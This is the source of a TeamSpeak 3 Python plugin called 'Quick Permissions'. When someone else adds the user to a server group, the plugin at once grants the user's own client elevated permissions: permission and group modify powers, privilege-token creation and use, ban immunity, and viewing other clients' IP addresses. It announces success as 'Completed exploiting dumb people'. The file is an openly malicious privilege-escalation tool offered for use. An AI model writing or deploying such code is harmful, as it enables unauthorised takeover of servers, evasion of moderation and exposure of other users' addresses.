import ts3lib, ts3defines
from ts3plugin import ts3plugin, PluginHost
from pytson import getCurrentApiVersion
from bluscream import timestamp

class quickPerm(ts3plugin):
    name = "Quick Permissions"
    try: apiVersion = getCurrentApiVersion()
    except: apiVersion = 21
    requestAutoload = True
    version = "1.0"
    author = "Bluscream"
    description = "Stolen from NoX by exp111"
    offersConfigure = False
    commandKeyword = ""
    infoTitle = None
    menuItems = [(ts3defines.PluginMenuType.PLUGIN_MENU_TYPE_GLOBAL, 0, "Toggle " + name, "")]
    hotkeys = []
    enabled = True
    retcode = ""
    permissions = [
        ("i_permission_modify_power", 75, True),
        ("i_client_permission_modify_power", 75, True),
        ("i_group_modify_power", 75, True),
        ("i_group_member_add_power", 75, True),
        ("b_virtualserver_token_add", True, True),
        ("b_virtualserver_token_list", True, True),
        ("b_virtualserver_token_use", True, True),
        ("b_virtualserver_token_delete", True, True),
        ("b_client_ignore_bans", True, True),
        ("b_client_remoteaddress_view", True, True)
    ]

    def __init__(self):
        if PluginHost.cfg.getboolean("general", "verbose"): ts3lib.printMessageToCurrentTab("{0}[color=orange]{1}[/color] Plugin for pyTSon by [url=https://github.com/{2}]{2}[/url] loaded.".format(timestamp(), self.name, self.author))

    def onMenuItemEvent(self, schid, atype, menuItemID, selectedItemID):
        if atype != ts3defines.PluginMenuType.PLUGIN_MENU_TYPE_GLOBAL or menuItemID != 0: return
        self.enabled = not self.enabled
        ts3lib.printMessageToCurrentTab("{} set to [color=orange]{}".format(self.name,self.enabled))

    def onServerGroupClientAddedEvent(self, schid, clientID, clientName, clientUniqueIdentity, sgid, invokerClientID, invokerName, invokerUniqueIdentity):
        if not self.enabled: return
        if invokerClientID < 1: return
        (err, ownID) = ts3lib.getClientID(schid)
        if ownID != clientID: return
        if invokerClientID == ownID: return
        (err, dgid) = ts3lib.getServerVariable(schid, ts3defines.VirtualServerPropertiesRare.VIRTUALSERVER_DEFAULT_SERVER_GROUP)
        if sgid == dgid: return
        (err, cldbid) = ts3lib.getClientVariable(schid, ownID, ts3defines.ClientPropertiesRare.CLIENT_DATABASE_ID)
        pids = [];pvals = [];pskips = []
        for perm in self.permissions:
            (err, pid) = ts3lib.getPermissionIDByName(schid, perm[0])
            pids.append(pid)
            pvals.append(100 if sgid == 2 and perm[1] == 75 else perm[1])
            pskips.append(perm[2])
        result = ts3lib.requestClientAddPerm(schid, cldbid, pids, pvals, pskips)
        if result: ts3lib.printMessageToCurrentTab("[color=green]Completed exploiting dumb people")
        else: ts3lib.printMessageToCurrentTab("[color=red]Failed giving permissions")

    def onServerErrorEvent(self, schid, errorMessage, error, returnCode, extraMessage):
        if returnCode == self.retcode: self.retcode = ""; return True
